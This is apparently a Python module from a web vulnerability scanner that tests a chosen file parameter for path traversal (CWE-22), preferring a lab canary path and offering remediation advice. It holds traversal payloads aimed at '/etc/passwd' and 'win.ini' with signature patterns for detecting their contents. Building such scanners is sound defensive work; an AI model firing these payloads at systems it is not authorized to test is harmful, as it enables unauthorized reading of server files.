from services.scan_runtime import RequestBudgetExceeded, ScanCancelled
import re

from vulnerabilities.common import append_query_param, body_text, error_result, make_result, safe_request

meta = {
    "name": "Path Traversal",
    "severity": "High",
    "description": "Checks a nominated file/path parameter with a small signature-based payload set.",
    "category": "Access Control",
}
inputs = [
    {"name": "param", "label": "File/path parameter", "type": "text", "required": True, "placeholder": "file"},
    {"name": "canary_path", "label": "Authorized lab canary path", "type": "text", "required": False, "placeholder": "../private/cyberscan-canary.txt", "help": "Recommended for safe, high-confidence lab verification."},
    {"name": "expected_marker", "label": "Expected canary marker", "type": "text", "required": False, "placeholder": "CYBERSCAN_CANARY"},
]

OS_PROBES = [
    ("../../../../etc/passwd", re.compile(r"root:[x*]:0:0:")),
    (r"..\..\..\..\Windows\win.ini", re.compile(r"\[fonts\]|\[extensions\]", re.I)),
]


def scan(url, param="", canary_path="", expected_marker=""):
    if not param:
        return make_result(
            False,
            "A file/path parameter is required.",
            status="inconclusive",
            endpoint=url,
            parameter=param,
            evidence={"parameter": param, "reason": "missing_required_parameter"},
            requests_made=0,
        )
    requests_made = 0
    probes = []
    payload_family = "os_signature"
    if canary_path and expected_marker:
        payload_family = "lab_canary"
        probes.append((canary_path, re.compile(re.escape(expected_marker))))
    else:
        probes.extend(OS_PROBES)
    checked_probes = []
    try:
        for payload, signature in probes[:3]:
            requests_made += 1
            response = safe_request("GET", append_query_param(url, param, payload))
            match = signature.search(body_text(response))
            marker_matched = bool(match and payload_family == "lab_canary")
            signature_matched = bool(match and payload_family != "lab_canary")
            probe_evidence = {
                "parameter": param,
                "payload_family": payload_family,
                "payload": payload,
                "status_code": response.status_code,
                "marker_matched": marker_matched,
                "signature_matched": signature_matched,
                "matched_signature": match.group(0)[:120] if match else "",
                "final_decision": "confirmed_file_disclosure" if match else "no_marker_or_signature_match",
            }
            checked_probes.append(probe_evidence)
            if match:
                return make_result(
                    True,
                    "A known file signature was returned after a traversal-style path was supplied.",
                    severity="High",
                    confidence="High" if payload_family == "lab_canary" else "Medium",
                    evidence={
                        "parameter": param,
                        "payload_family": payload_family,
                        "status_code": response.status_code,
                        "marker_matched": marker_matched,
                        "signature_matched": signature_matched,
                        "checked_probes": checked_probes,
                        "final_decision": "confirmed_canary_marker" if marker_matched else "confirmed_os_file_signature",
                    },
                    recommendation="Resolve and canonicalize paths, enforce an allowlisted base directory, and never concatenate untrusted path input.",
                    endpoint=response.url,
                    parameter=param,
                    cwe="CWE-22",
                    cvss=7.5,
                    requests_made=requests_made,
                )
        return make_result(
            False,
            "No known file signature was returned for the tested traversal payloads.",
            severity="Info",
            confidence="High" if canary_path and expected_marker else "Medium",
            evidence={
                "parameter": param,
                "payload_family": payload_family,
                "tested_payload_count": len(probes[:3]),
                "used_lab_canary": bool(canary_path and expected_marker),
                "marker_matched": False,
                "signature_matched": False,
                "checked_probes": checked_probes,
                "final_decision": "no_marker_or_signature_match",
            },
            endpoint=url,
            parameter=param,
            cwe="CWE-22",
            requests_made=requests_made,
        )
    except (ScanCancelled, RequestBudgetExceeded):
        raise
    except Exception as exc:
        return error_result(f"Path-traversal check failed: {exc}", endpoint=url, parameter=param, requests_made=requests_made)
